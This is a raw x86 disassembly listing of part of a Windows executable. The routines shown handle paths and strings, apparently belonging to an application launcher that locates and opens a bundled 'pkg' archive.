  4024ba:	e8 91 f6 ff ff       	call   0x401b50
  4024bf:	83 c4 08             	add    $0x8,%esp
  4024c2:	b8 01 00 00 00       	mov    $0x1,%eax
  4024c7:	eb bf                	jmp    0x402488
  4024c9:	ff 74 24 18          	push   0x18(%esp)
  4024cd:	68 5c 68 42 00       	push   $0x42685c
  4024d2:	e8 79 f6 ff ff       	call   0x401b50
  4024d7:	8b 35 4c 4b 43 00    	mov    0x434b4c,%esi
  4024dd:	83 c4 08             	add    $0x8,%esp
  4024e0:	8b ce                	mov    %esi,%ecx
  4024e2:	ff 15 8c 61 42 00    	call   *0x42618c
  4024e8:	ff d6                	call   *%esi
  4024ea:	83 c8 ff             	or     $0xffffffff,%eax
  4024ed:	eb 99                	jmp    0x402488
  4024ef:	68 24 68 42 00       	push   $0x426824
  4024f4:	e8 57 f6 ff ff       	call   0x401b50
  4024f9:	83 c4 04             	add    $0x4,%esp
  4024fc:	83 c8 ff             	or     $0xffffffff,%eax
  4024ff:	eb 87                	jmp    0x402488
  402501:	cc                   	int3
  402502:	cc                   	int3
  402503:	cc                   	int3
  402504:	cc                   	int3
  402505:	cc                   	int3
  402506:	cc                   	int3
  402507:	cc                   	int3
  402508:	cc                   	int3
  402509:	cc                   	int3
  40250a:	cc                   	int3
  40250b:	cc                   	int3
  40250c:	cc                   	int3
  40250d:	cc                   	int3
  40250e:	cc                   	int3
  40250f:	cc                   	int3
  402510:	b8 14 50 00 00       	mov    $0x5014,%eax
  402515:	e8 06 73 00 00       	call   0x409820
  40251a:	a1 08 40 43 00       	mov    0x434008,%eax
  40251f:	33 c4                	xor    %esp,%eax
  402521:	89 84 24 10 50 00 00 	mov    %eax,0x5010(%esp)
  402528:	53                   	push   %ebx
  402529:	55                   	push   %ebp
  40252a:	56                   	push   %esi
  40252b:	8b b4 24 28 50 00 00 	mov    0x5028(%esp),%esi
  402532:	57                   	push   %edi
  402533:	6a 00                	push   $0x0
  402535:	6a 02                	push   $0x2
  402537:	89 74 24 1c          	mov    %esi,0x1c(%esp)
  40253b:	e8 78 f7 00 00       	call   0x411cb8
  402540:	83 c4 04             	add    $0x4,%esp
  402543:	50                   	push   %eax
  402544:	e8 06 03 01 00       	call   0x41284f
  402549:	83 c4 08             	add    $0x8,%esp
  40254c:	e8 1f f5 ff ff       	call   0x401a70
  402551:	8b f8                	mov    %eax,%edi
  402553:	85 ff                	test   %edi,%edi
  402555:	0f 84 2b 01 00 00    	je     0x402686
  40255b:	ff 36                	push   (%esi)
  40255d:	8d 44 24 24          	lea    0x24(%esp),%eax
  402561:	50                   	push   %eax
  402562:	e8 19 05 00 00       	call   0x402a80
  402567:	83 c4 08             	add    $0x8,%esp
  40256a:	85 c0                	test   %eax,%eax
  40256c:	0f 84 14 01 00 00    	je     0x402686
  402572:	8d 44 24 20          	lea    0x20(%esp),%eax
  402576:	50                   	push   %eax
  402577:	8d 84 24 24 10 00 00 	lea    0x1024(%esp),%eax
  40257e:	50                   	push   %eax
  40257f:	e8 fc 03 00 00       	call   0x402980
  402584:	83 c4 08             	add    $0x8,%esp
  402587:	85 c0                	test   %eax,%eax
  402589:	0f 84 f7 00 00 00    	je     0x402686
  40258f:	8d 44 24 20          	lea    0x20(%esp),%eax
  402593:	50                   	push   %eax
  402594:	8d 84 24 24 20 00 00 	lea    0x2024(%esp),%eax
  40259b:	50                   	push   %eax
  40259c:	e8 6f 04 00 00       	call   0x402a10
  4025a1:	83 c4 08             	add    $0x8,%esp
  4025a4:	85 c0                	test   %eax,%eax
  4025a6:	0f 84 da 00 00 00    	je     0x402686
  4025ac:	68 d0 68 42 00       	push   $0x4268d0
  4025b1:	e8 1a 33 00 00       	call   0x4058d0
  4025b6:	8b d8                	mov    %eax,%ebx
  4025b8:	83 c4 04             	add    $0x4,%esp
  4025bb:	33 c0                	xor    %eax,%eax
  4025bd:	85 db                	test   %ebx,%ebx
  4025bf:	0f 95 c0             	setne  %al
  4025c2:	89 44 24 18          	mov    %eax,0x18(%esp)
  4025c6:	85 db                	test   %ebx,%ebx
  4025c8:	74 63                	je     0x40262d
  4025ca:	68 dc 68 42 00       	push   $0x4268dc
  4025cf:	e8 fc 32 00 00       	call   0x4058d0
  4025d4:	8b e8                	mov    %eax,%ebp
  4025d6:	83 c4 04             	add    $0x4,%esp
  4025d9:	85 ed                	test   %ebp,%ebp
  4025db:	74 50                	je     0x40262d
  4025dd:	ba f0 68 42 00       	mov    $0x4268f0,%edx
  4025e2:	8b cd                	mov    %ebp,%ecx
  4025e4:	8a 01                	mov    (%ecx),%al
  4025e6:	3a 02                	cmp    (%edx),%al
  4025e8:	75 1a                	jne    0x402604
  4025ea:	84 c0                	test   %al,%al
  4025ec:	74 12                	je     0x402600
  4025ee:	8a 41 01             	mov    0x1(%ecx),%al
  4025f1:	3a 42 01             	cmp    0x1(%edx),%al
  4025f4:	75 0e                	jne    0x402604
  4025f6:	83 c1 02             	add    $0x2,%ecx
  4025f9:	83 c2 02             	add    $0x2,%edx
  4025fc:	84 c0                	test   %al,%al
  4025fe:	75 e4                	jne    0x4025e4
  402600:	33 f6                	xor    %esi,%esi
  402602:	eb 05                	jmp    0x402609
  402604:	1b f6                	sbb    %esi,%esi
  402606:	83 ce 01             	or     $0x1,%esi
  402609:	55                   	push   %ebp
  40260a:	e8 39 f5 00 00       	call   0x411b48
  40260f:	68 dc 68 42 00       	push   $0x4268dc
  402614:	e8 a7 37 00 00       	call   0x405dc0
  402619:	33 c0                	xor    %eax,%eax
  40261b:	83 c4 08             	add    $0x8,%esp
  40261e:	85 f6                	test   %esi,%esi
  402620:	8b 74 24 14          	mov    0x14(%esp),%esi
  402624:	0f 45 44 24 18       	cmovne 0x18(%esp),%eax
  402629:	8b e8                	mov    %eax,%ebp
  40262b:	eb 04                	jmp    0x402631
  40262d:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  402631:	68 d0 68 42 00       	push   $0x4268d0
  402636:	e8 85 37 00 00       	call   0x405dc0
  40263b:	8d 44 24 24          	lea    0x24(%esp),%eax
  40263f:	50                   	push   %eax
  402640:	50                   	push   %eax
  402641:	57                   	push   %edi
  402642:	e8 39 f3 ff ff       	call   0x401980
  402647:	83 c4 10             	add    $0x10,%esp
  40264a:	85 c0                	test   %eax,%eax
  40264c:	0f 85 ef 00 00 00    	jne    0x402741
  402652:	8d 44 24 20          	lea    0x20(%esp),%eax
  402656:	50                   	push   %eax
  402657:	8d 84 24 24 10 00 00 	lea    0x1024(%esp),%eax
  40265e:	50                   	push   %eax
  40265f:	57                   	push   %edi
  402660:	e8 1b f3 ff ff       	call   0x401980
  402665:	83 c4 0c             	add    $0xc,%esp
  402668:	85 c0                	test   %eax,%eax
  40266a:	75 36                	jne    0x4026a2
  40266c:	8d 84 24 20 10 00 00 	lea    0x1020(%esp),%eax
  402673:	50                   	push   %eax
  402674:	8d 44 24 24          	lea    0x24(%esp),%eax
  402678:	50                   	push   %eax
  402679:	68 f8 68 42 00       	push   $0x4268f8
  40267e:	e8 cd f4 ff ff       	call   0x401b50
  402683:	83 c4 0c             	add    $0xc,%esp
  402686:	83 c8 ff             	or     $0xffffffff,%eax
  402689:	8b 8c 24 20 50 00 00 	mov    0x5020(%esp),%ecx
  402690:	5f                   	pop    %edi
  402691:	5e                   	pop    %esi
  402692:	5d                   	pop    %ebp
  402693:	5b                   	pop    %ebx
  402694:	33 cc                	xor    %esp,%ecx
  402696:	e8 6c 71 00 00       	call   0x409807
  40269b:	81 c4 14 50 00 00    	add    $0x5014,%esp
  4026a1:	c3                   	ret
  4026a2:	85 db                	test   %ebx,%ebx
  4026a4:	0f 85 97 00 00 00    	jne    0x402741
  4026aa:	8d 44 24 20          	lea    0x20(%esp),%eax
  4026ae:	68 50 63 42 00       	push   $0x426350
  4026b3:	50                   	push   %eax
  4026b4:	e8 e7 04 00 00       	call   0x402ba0
  4026b9:	8b f0                	mov    %eax,%esi
  4026bb:	83 c4 08             	add    $0x8,%esp
  4026be:	85 f6                	test   %esi,%esi
  4026c0:	75 13                	jne    0x4026d5
  4026c2:	83 c8 ff             	or     $0xffffffff,%eax
  4026c5:	50                   	push   %eax
  4026c6:	8d 84 24 24 10 00 00 	lea    0x1024(%esp),%eax
  4026cd:	50                   	push   %eax
  4026ce:	68 48 69 42 00       	push   $0x426948
  4026d3:	eb a9                	jmp    0x40267e
  4026d5:	8b 0d f0 85 42 00    	mov    0x4285f0,%ecx
  4026db:	a1 f4 85 42 00       	mov    0x4285f4,%eax
  4026e0:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  4026e4:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4026e8:	0f ac c1 18          	shrd   $0x18,%eax,%ecx
  4026ec:	6a 08                	push   $0x8
  4026ee:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  4026f2:	80 c1 0d             	add    $0xd,%cl
  4026f5:	50                   	push   %eax
  4026f6:	56                   	push   %esi
  4026f7:	88 4c 24 27          	mov    %cl,0x27(%esp)
  4026fb:	e8 b0 38 00 00       	call   0x405fb0
  402700:	83 c4 0c             	add    $0xc,%esp
  402703:	0b c2                	or     %edx,%eax
  402705:	75 21                	jne    0x402728
  402707:	56                   	push   %esi
  402708:	e8 44 a6 00 00       	call   0x40cd51
  40270d:	83 c4 04             	add    $0x4,%esp
  402710:	b8 01 00 00 00       	mov    $0x1,%eax
  402715:	50                   	push   %eax
  402716:	8d 84 24 24 10 00 00 	lea    0x1024(%esp),%eax
  40271d:	50                   	push   %eax
  40271e:	68 48 69 42 00       	push   $0x426948
  402723:	e9 56 ff ff ff       	jmp    0x40267e
  402728:	8b 84 24 28 50 00 00 	mov    0x5028(%esp),%eax
  40272f:	89 87 78 50 00 00    	mov    %eax,0x5078(%edi)
  402735:	8b 44 24 14          	mov    0x14(%esp),%eax
  402739:	89 87 7c 50 00 00    	mov    %eax,0x507c(%edi)
  40273f:	eb 17                	jmp    0x402758
  402741:	8b 84 24 28 50 00 00 	mov    0x5028(%esp),%eax
  402748:	89 87 78 50 00 00    	mov    %eax,0x5078(%edi)
  40274e:	89 b7 7c 50 00 00    	mov    %esi,0x507c(%edi)
  402754:	85 db                	test   %ebx,%ebx
  402756:	75 14                	jne    0x40276c
  402758:	57                   	push   %edi
  402759:	e8 12 fb ff ff       	call   0x402270
  40275e:	83 c4 04             	add    $0x4,%esp
  402761:	85 c0                	test   %eax,%eax
  402763:	75 41                	jne    0x4027a6
  402765:	8d 9c 24 20 20 00 00 	lea    0x2020(%esp),%ebx
  40276c:	68 00 10 00 00       	push   $0x1000
  402771:	8d 84 24 24 30 00 00 	lea    0x3024(%esp),%eax
  402778:	53                   	push   %ebx
  402779:	50                   	push   %eax
  40277a:	e8 11 41 00 00       	call   0x406890
  40277f:	83 c4 0c             	add    $0xc,%esp
  402782:	85 c0                	test   %eax,%eax
  402784:	75 12                	jne    0x402798
  402786:	68 7c 69 42 00       	push   $0x42697c
  40278b:	e8 c0 f3 ff ff       	call   0x401b50
  402790:	83 c4 04             	add    $0x4,%esp
  402793:	e9 ee fe ff ff       	jmp    0x402686
  402798:	8d 84 24 20 30 00 00 	lea    0x3020(%esp),%eax
  40279f:	50                   	push   %eax
  4027a0:	ff 15 74 60 42 00    	call   *0x426074
  4027a6:	e8 65 26 00 00       	call   0x404e10
  4027ab:	89 44 24 10          	mov    %eax,0x10(%esp)
  4027af:	85 ed                	test   %ebp,%ebp
  4027b1:	75 5b                	jne    0x40280e
  4027b3:	55                   	push   %ebp
  4027b4:	57                   	push   %edi
  4027b5:	50                   	push   %eax
  4027b6:	e8 45 23 00 00       	call   0x404b00
  4027bb:	83 c4 0c             	add    $0xc,%esp
  4027be:	85 c0                	test   %eax,%eax
  4027c0:	75 4c                	jne    0x40280e
  4027c2:	ff 74 24 10          	push   0x10(%esp)
  4027c6:	57                   	push   %edi
  4027c7:	e8 64 1e 00 00       	call   0x404630
  4027cc:	83 c4 08             	add    $0x8,%esp
  4027cf:	85 c0                	test   %eax,%eax
  4027d1:	75 23                	jne    0x4027f6
  4027d3:	ff 74 24 10          	push   0x10(%esp)
  4027d7:	e8 e4 1d 00 00       	call   0x4045c0
  4027dc:	83 c4 04             	add    $0x4,%esp
  4027df:	85 c0                	test   %eax,%eax
  4027e1:	75 13                	jne    0x4027f6
  4027e3:	8d 44 24 20          	lea    0x20(%esp),%eax
  4027e7:	50                   	push   %eax
  4027e8:	ff 74 24 14          	push   0x14(%esp)
  4027ec:	e8 8f 24 00 00       	call   0x404c80
  4027f1:	83 c4 08             	add    $0x8,%esp
  4027f4:	eb 25                	jmp    0x40281b
  4027f6:	ff 74 24 10          	push   0x10(%esp)
  4027fa:	e8 81 20 00 00       	call   0x404880
  4027ff:	8d 44 24 14          	lea    0x14(%esp),%eax
  402803:	50                   	push   %eax
  402804:	e8 a7 25 00 00       	call   0x404db0
  402809:	83 c4 08             	add    $0x8,%esp
  40280c:	eb 0d                	jmp    0x40281b
  40280e:	8d 44 24 10          	lea    0x10(%esp),%eax
  402812:	50                   	push   %eax
  402813:	e8 98 25 00 00       	call   0x404db0
  402818:	83 c4 04             	add    $0x4,%esp
  40281b:	85 db                	test   %ebx,%ebx
  40281d:	0f 84 ad 00 00 00    	je     0x4028d0
  402823:	8b cb                	mov    %ebx,%ecx
  402825:	8d 84 24 20 20 00 00 	lea    0x2020(%esp),%eax
  40282c:	0f 1f 40 00          	nopl   0x0(%eax)
  402830:	8a 10                	mov    (%eax),%dl
  402832:	3a 11                	cmp    (%ecx),%dl
  402834:	75 1a                	jne    0x402850
  402836:	84 d2                	test   %dl,%dl
  402838:	74 12                	je     0x40284c
  40283a:	8a 50 01             	mov    0x1(%eax),%dl
  40283d:	3a 51 01             	cmp    0x1(%ecx),%dl
  402840:	75 0e                	jne    0x402850
  402842:	83 c0 02             	add    $0x2,%eax
  402845:	83 c1 02             	add    $0x2,%ecx
  402848:	84 d2                	test   %dl,%dl
  40284a:	75 e4                	jne    0x402830
  40284c:	33 c0                	xor    %eax,%eax
  40284e:	eb 05                	jmp    0x402855
  402850:	1b c0                	sbb    %eax,%eax
  402852:	83 c8 01             	or     $0x1,%eax
  402855:	85 c0                	test   %eax,%eax
  402857:	74 46                	je     0x40289f
  402859:	53                   	push   %ebx
  40285a:	68 bc 66 42 00       	push   $0x4266bc
  40285f:	8d b7 70 30 00 00    	lea    0x3070(%edi),%esi
  402865:	68 00 10 00 00       	push   $0x1000
  40286a:	56                   	push   %esi
  40286b:	e8 30 f2 ff ff       	call   0x401aa0
  402870:	83 c4 10             	add    $0x10,%esp
  402873:	3d 00 10 00 00       	cmp    $0x1000,%eax
  402878:	0f 8d 08 fe ff ff    	jge    0x402686
  40287e:	c7 87 70 50 00 00 01 	movl   $0x1,0x5070(%edi)
  402885:	00 00 00 
  402888:	0f 1f 84 00 00 00 00 	nopl   0x0(%eax,%eax,1)
  40288f:	00 
  402890:	8a 06                	mov    (%esi),%al
  402892:	8d 76 01             	lea    0x1(%esi),%esi
  402895:	88 86 ff 0f 00 00    	mov    %al,0xfff(%esi)
  40289b:	84 c0                	test   %al,%al
  40289d:	75 f1                	jne    0x402890
  40289f:	57                   	push   %edi
  4028a0:	e8 bb f9 ff ff       	call   0x402260
  4028a5:	57                   	push   %edi
  4028a6:	e8 75 f8 ff ff       	call   0x402120
  4028ab:	57                   	push   %edi
  4028ac:	8b d8                	mov    %eax,%ebx
  4028ae:	e8 9d f9 ff ff       	call   0x402250
  4028b3:	ff 74 24 1c          	push   0x1c(%esp)
  4028b7:	e8 c4 1f 00 00       	call   0x404880
  4028bc:	8d 44 24 20          	lea    0x20(%esp),%eax
  4028c0:	50                   	push   %eax
  4028c1:	e8 ea 24 00 00       	call   0x404db0
  4028c6:	83 c4 14             	add    $0x14,%esp
  4028c9:	8b c3                	mov    %ebx,%eax
  4028cb:	e9 b9 fd ff ff       	jmp    0x402689
  4028d0:	ff 74 24 10          	push   0x10(%esp)
  4028d4:	57                   	push   %edi
  4028d5:	e8 a6 f8 ff ff       	call   0x402180
  4028da:	83 c4 08             	add    $0x8,%esp
  4028dd:	85 c0                	test   %eax,%eax
  4028df:	0f 85 a1 fd ff ff    	jne    0x402686
  4028e5:	80 bf 70 30 00 00 00 	cmpb   $0x0,0x3070(%edi)
  4028ec:	8d b7 70 30 00 00    	lea    0x3070(%edi),%esi
  4028f2:	8d 84 24 20 20 00 00 	lea    0x2020(%esp),%eax
  4028f9:	0f 45 c6             	cmovne %esi,%eax
  4028fc:	50                   	push   %eax
  4028fd:	68 d0 68 42 00       	push   $0x4268d0
  402902:	e8 79 34 00 00       	call   0x405d80
  402907:	68 d0 68 42 00       	push   $0x4268d0
  40290c:	e8 bf 2f 00 00       	call   0x4058d0
  402911:	57                   	push   %edi
  402912:	e8 d9 1a 00 00       	call   0x4043f0
  402917:	83 c4 10             	add    $0x10,%esp
  40291a:	83 f8 ff             	cmp    $0xffffffff,%eax
  40291d:	0f 84 63 fd ff ff    	je     0x402686
  402923:	e8 38 f9 ff ff       	call   0x402260
  402928:	ff 74 24 14          	push   0x14(%esp)
  40292c:	8d 44 24 24          	lea    0x24(%esp),%eax
  402930:	ff b4 24 2c 50 00 00 	push   0x502c(%esp)
  402937:	57                   	push   %edi
  402938:	50                   	push   %eax
  402939:	e8 b2 34 00 00       	call   0x405df0
  40293e:	ff 74 24 20          	push   0x20(%esp)
  402942:	8b d8                	mov    %eax,%ebx
  402944:	e8 37 1f 00 00       	call   0x404880
  402949:	8d 44 24 24          	lea    0x24(%esp),%eax
  40294d:	50                   	push   %eax
  40294e:	e8 5d 24 00 00       	call   0x404db0
  402953:	83 c4 18             	add    $0x18,%esp
  402956:	83 bf 70 50 00 00 01 	cmpl   $0x1,0x5070(%edi)
  40295d:	75 09                	jne    0x402968
  40295f:	56                   	push   %esi
  402960:	e8 8b 32 00 00       	call   0x405bf0
  402965:	83 c4 04             	add    $0x4,%esp
  402968:	57                   	push   %edi
  402969:	e8 c2 f0 ff ff       	call   0x401a30
  40296e:	83 c4 04             	add    $0x4,%esp
  402971:	8b c3                	mov    %ebx,%eax
  402973:	e9 11 fd ff ff       	jmp    0x402689
  402978:	cc                   	int3
  402979:	cc                   	int3
  40297a:	cc                   	int3
  40297b:	cc                   	int3
  40297c:	cc                   	int3
  40297d:	cc                   	int3
  40297e:	cc                   	int3
  40297f:	cc                   	int3
  402980:	8b 44 24 08          	mov    0x8(%esp),%eax
  402984:	56                   	push   %esi
  402985:	8b 74 24 08          	mov    0x8(%esp),%esi
  402989:	8b d6                	mov    %esi,%edx
  40298b:	2b d0                	sub    %eax,%edx
  40298d:	0f 1f 00             	nopl   (%eax)
  402990:	8a 08                	mov    (%eax),%cl
  402992:	8d 40 01             	lea    0x1(%eax),%eax
  402995:	88 4c 02 ff          	mov    %cl,-0x1(%edx,%eax,1)
  402999:	84 c9                	test   %cl,%cl
  40299b:	75 f3                	jne    0x402990
  40299d:	8b ce                	mov    %esi,%ecx
  40299f:	8d 51 01             	lea    0x1(%ecx),%edx
  4029a2:	8a 01                	mov    (%ecx),%al
  4029a4:	41                   	inc    %ecx
  4029a5:	84 c0                	test   %al,%al
  4029a7:	75 f9                	jne    0x4029a2
  4029a9:	2b ca                	sub    %edx,%ecx
  4029ab:	b8 01 00 00 00       	mov    $0x1,%eax
  4029b0:	c7 44 31 fd 70 6b 67 	movl   $0x676b70,-0x3(%ecx,%esi,1)
  4029b7:	00 
  4029b8:	5e                   	pop    %esi
  4029b9:	c3                   	ret
  4029ba:	cc                   	int3
  4029bb:	cc                   	int3
  4029bc:	cc                   	int3
  4029bd:	cc                   	int3
  4029be:	cc                   	int3
  4029bf:	cc                   	int3
  4029c0:	56                   	push   %esi
  4029c1:	8b 74 24 0c          	mov    0xc(%esp),%esi
  4029c5:	6a 5c                	push   $0x5c
  4029c7:	56                   	push   %esi
  4029c8:	e8 c3 82 00 00       	call   0x40ac90
  4029cd:	83 c4 08             	add    $0x8,%esp
  4029d0:	85 c0                	test   %eax,%eax
  4029d2:	75 0f                	jne    0x4029e3
  4029d4:	6a 2f                	push   $0x2f
  4029d6:	56                   	push   %esi
  4029d7:	e8 b4 82 00 00       	call   0x40ac90
  4029dc:	83 c4 08             	add    $0x8,%esp
  4029df:	85 c0                	test   %eax,%eax
  4029e1:	74 03                	je     0x4029e6
  4029e3:	8d 70 01             	lea    0x1(%eax),%esi
  4029e6:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4029ea:	2b ce                	sub    %esi,%ecx
  4029ec:	0f 1f 40 00          	nopl   0x0(%eax)
  4029f0:	8a 06                	mov    (%esi),%al
  4029f2:	8d 76 01             	lea    0x1(%esi),%esi
  4029f5:	88 44 31 ff          	mov    %al,-0x1(%ecx,%esi,1)
  4029f9:	84 c0                	test   %al,%al
  4029fb:	75 f3                	jne    0x4029f0
  4029fd:	5e                   	pop    %esi
  4029fe:	b8 01 00 00 00       	mov    $0x1,%eax
  402a03:	c3                   	ret
  402a04:	cc                   	int3
  402a05:	cc                   	int3
  402a06:	cc                   	int3
  402a07:	cc                   	int3
  402a08:	cc                   	int3
  402a09:	cc                   	int3
  402a0a:	cc                   	int3
  402a0b:	cc                   	int3
  402a0c:	cc                   	int3
  402a0d:	cc                   	int3
  402a0e:	cc                   	int3
  402a0f:	cc                   	int3
  402a10:	56                   	push   %esi
  402a11:	ff 74 24 0c          	push   0xc(%esp)
  402a15:	8b 74 24 0c          	mov    0xc(%esp),%esi
  402a19:	68 bc 66 42 00       	push   $0x4266bc
  402a1e:	68 00 10 00 00       	push   $0x1000
  402a23:	56                   	push   %esi
  402a24:	e8 77 f0 ff ff       	call   0x401aa0
  402a29:	83 c4 10             	add    $0x10,%esp
  402a2c:	3d 00 10 00 00       	cmp    $0x1000,%eax
  402a31:	7c 04                	jl     0x402a37
  402a33:	33 c0                	xor    %eax,%eax
  402a35:	5e                   	pop    %esi
  402a36:	c3                   	ret
  402a37:	8b ce                	mov    %esi,%ecx
  402a39:	8d 51 01             	lea    0x1(%ecx),%edx
  402a3c:	0f 1f 40 00          	nopl   0x0(%eax)
  402a40:	8a 01                	mov    (%ecx),%al
  402a42:	41                   	inc    %ecx
  402a43:	84 c0                	test   %al,%al
  402a45:	75 f9                	jne    0x402a40
  402a47:	2b ca                	sub    %edx,%ecx
  402a49:	80 7c 31 ff 5c       	cmpb   $0x5c,-0x1(%ecx,%esi,1)
  402a4e:	75 04                	jne    0x402a54
  402a50:	88 44 31 ff          	mov    %al,-0x1(%ecx,%esi,1)
  402a54:	6a 5c                	push   $0x5c
  402a56:	56                   	push   %esi
  402a57:	e8 34 82 00 00       	call   0x40ac90
  402a5c:	83 c4 08             	add    $0x8,%esp
  402a5f:	85 c0                	test   %eax,%eax
  402a61:	74 0a                	je     0x402a6d
  402a63:	c6 00 00             	movb   $0x0,(%eax)
  402a66:	b8 01 00 00 00       	mov    $0x1,%eax
  402a6b:	5e                   	pop    %esi
  402a6c:	c3                   	ret
  402a6d:	66 c7 06 2e 00       	movw   $0x2e,(%esi)
  402a72:	b8 01 00 00 00       	mov    $0x1,%eax
  402a77:	5e                   	pop    %esi
  402a78:	c3                   	ret
  402a79:	cc                   	int3
  402a7a:	cc                   	int3
  402a7b:	cc                   	int3
  402a7c:	cc                   	int3
  402a7d:	cc                   	int3
  402a7e:	cc                   	int3
  402a7f:	cc                   	int3
  402a80:	b8 04 20 00 00       	mov    $0x2004,%eax
  402a85:	e8 96 6d 00 00       	call   0x409820
  402a8a:	a1 08 40 43 00       	mov    0x434008,%eax
  402a8f:	33 c4                	xor    %esp,%eax
  402a91:	89 84 24 00 20 00 00 	mov    %eax,0x2000(%esp)
  402a98:	56                   	push   %esi
  402a99:	8b b4 24 0c 20 00 00 	mov    0x200c(%esp),%esi
  402aa0:	8d 44 24 04          	lea    0x4(%esp),%eax
  402aa4:	68 00 10 00 00       	push   $0x1000
  402aa9:	50                   	push   %eax
  402aaa:	6a 00                	push   $0x0
  402aac:	ff 15 70 60 42 00    	call   *0x426070
  402ab2:	85 c0                	test   %eax,%eax
  402ab4:	75 2a                	jne    0x402ae0
  402ab6:	68 a0 69 42 00       	push   $0x4269a0
  402abb:	68 c0 69 42 00       	push   $0x4269c0
  402ac0:	e8 bb f0 ff ff       	call   0x401b80
  402ac5:	83 c4 08             	add    $0x8,%esp
  402ac8:	33 c0                	xor    %eax,%eax
  402aca:	5e                   	pop    %esi
  402acb:	8b 8c 24 00 20 00 00 	mov    0x2000(%esp),%ecx
  402ad2:	33 cc                	xor    %esp,%ecx
  402ad4:	e8 2e 6d 00 00       	call   0x409807
  402ad9:	81 c4 04 20 00 00    	add    $0x2004,%esp
  402adf:	c3                   	ret
  402ae0:	68 00 10 00 00       	push   $0x1000
  402ae5:	8d 44 24 08          	lea    0x8(%esp),%eax
  402ae9:	50                   	push   %eax
  402aea:	56                   	push   %esi
  402aeb:	e8 40 3e 00 00       	call   0x406930
  402af0:	83 c4 0c             	add    $0xc,%esp
  402af3:	85 c0                	test   %eax,%eax
  402af5:	75 25                	jne    0x402b1c
  402af7:	68 d4 69 42 00       	push   $0x4269d4
  402afc:	e8 4f f0 ff ff       	call   0x401b50
  402b01:	83 c4 04             	add    $0x4,%esp
  402b04:	33 c0                	xor    %eax,%eax
  402b06:	5e                   	pop    %esi
  402b07:	8b 8c 24 00 20 00 00 	mov    0x2000(%esp),%ecx
  402b0e:	33 cc                	xor    %esp,%ecx
  402b10:	e8 f2 6c 00 00       	call   0x409807
  402b15:	81 c4 04 20 00 00    	add    $0x2004,%esp
  402b1b:	c3                   	ret
  402b1c:	8b 8c 24 04 20 00 00 	mov    0x2004(%esp),%ecx
  402b23:	b8 01 00 00 00       	mov    $0x1,%eax
  402b28:	5e                   	pop    %esi
  402b29:	33 cc                	xor    %esp,%ecx
  402b2b:	e8 d7 6c 00 00       	call   0x409807
  402b30:	81 c4 04 20 00 00    	add    $0x2004,%esp
  402b36:	c3                   	ret
  402b37:	cc                   	int3
  402b38:	cc                   	int3
  402b39:	cc                   	int3
  402b3a:	cc                   	int3
  402b3b:	cc                   	int3
  402b3c:	cc                   	int3
  402b3d:	cc                   	int3
  402b3e:	cc                   	int3
  402b3f:	cc                   	int3
  402b40:	b8 38 20 00 00       	mov    $0x2038,%eax
  402b45:	e8 d6 6c 00 00       	call   0x409820
  402b4a:	a1 08 40 43 00       	mov    0x434008,%eax
  402b4f:	33 c4                	xor    %esp,%eax
  402b51:	89 84 24 34 20 00 00 	mov    %eax,0x2034(%esp)
  402b58:	8b 84 24 3c 20 00 00 	mov    0x203c(%esp),%eax
  402b5f:	68 00 10 00 00       	push   $0x1000
  402b64:	50                   	push   %eax
  402b65:	8d 44 24 38          	lea    0x38(%esp),%eax
  402b69:	50                   	push   %eax
  402b6a:	e8 21 3d 00 00       	call   0x406890
  402b6f:	8d 44 24 0c          	lea    0xc(%esp),%eax
  402b73:	50                   	push   %eax
  402b74:	8d 44 24 40          	lea    0x40(%esp),%eax
  402b78:	50                   	push   %eax
  402b79:	e8 c6 fc 00 00       	call   0x412844
  402b7e:	8b 8c 24 48 20 00 00 	mov    0x2048(%esp),%ecx
  402b85:	83 c4 14             	add    $0x14,%esp
  402b88:	f7 d8                	neg    %eax
  402b8a:	1b c0                	sbb    %eax,%eax
  402b8c:	33 cc                	xor    %esp,%ecx
  402b8e:	40                   	inc    %eax
  402b8f:	e8 73 6c 00 00       	call   0x409807
  402b94:	81 c4 38 20 00 00    	add    $0x2038,%esp
  402b9a:	c3                   	ret
  402b9b:	cc                   	int3
  402b9c:	cc                   	int3
  402b9d:	cc                   	int3
  402b9e:	cc                   	int3
  402b9f:	cc                   	int3
  402ba0:	b8 18 20 00 00       	mov    $0x2018,%eax
  402ba5:	e8 76 6c 00 00       	call   0x409820
  402baa:	a1 08 40 43 00       	mov    0x434008,%eax
  402baf:	33 c4                	xor    %esp,%eax
  402bb1:	89 84 24 14 20 00 00 	mov    %eax,0x2014(%esp)
  402bb8:	8b 84 24 1c 20 00 00 	mov    0x201c(%esp),%eax
  402bbf:	56                   	push   %esi
  402bc0:	8b b4 24 24 20 00 00 	mov    0x2024(%esp),%esi
  402bc7:	68 00 10 00 00       	push   $0x1000
  402bcc:	50                   	push   %eax
  402bcd:	8d 44 24 20          	lea    0x20(%esp),%eax
  402bd1:	50                   	push   %eax
  402bd2:	e8 b9 3c 00 00       	call   0x406890
  402bd7:	6a 0a                	push   $0xa
  402bd9:	8d 44 24 14          	lea    0x14(%esp),%eax
  402bdd:	56                   	push   %esi
  402bde:	50                   	push   %eax
  402bdf:	e8 ac 3c 00 00       	call   0x406890
  402be4:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  402be8:	50                   	push   %eax
  402be9:	8d 44 24 34          	lea    0x34(%esp),%eax
  402bed:	50                   	push   %eax
  402bee:	e8 39 01 01 00       	call   0x412d2c
  402bf3:	8b 8c 24 38 20 00 00 	mov    0x2038(%esp),%ecx
  402bfa:	83 c4 20             	add    $0x20,%esp
  402bfd:	5e                   	pop    %esi
  402bfe:	33 cc                	xor    %esp,%ecx
  402c00:	e8 02 6c 00 00       	call   0x409807
  402c05:	81 c4 18 20 00 00    	add    $0x2018,%esp
  402c0b:	c3                   	ret
  402c0c:	cc                   	int3
  402c0d:	cc                   	int3
  402c0e:	cc                   	int3
  402c0f:	cc                   	int3
  402c10:	56                   	push   %esi
  402c11:	8b 74 24 08          	mov    0x8(%esp),%esi
  402c15:	57                   	push   %edi
  402c16:	ff 74 24 10          	push   0x10(%esp)
  402c1a:	68 bc 66 42 00       	push   $0x4266bc
  402c1f:	68 00 10 00 00       	push   $0x1000
  402c24:	56                   	push   %esi
  402c25:	e8 76 ee ff ff       	call   0x401aa0
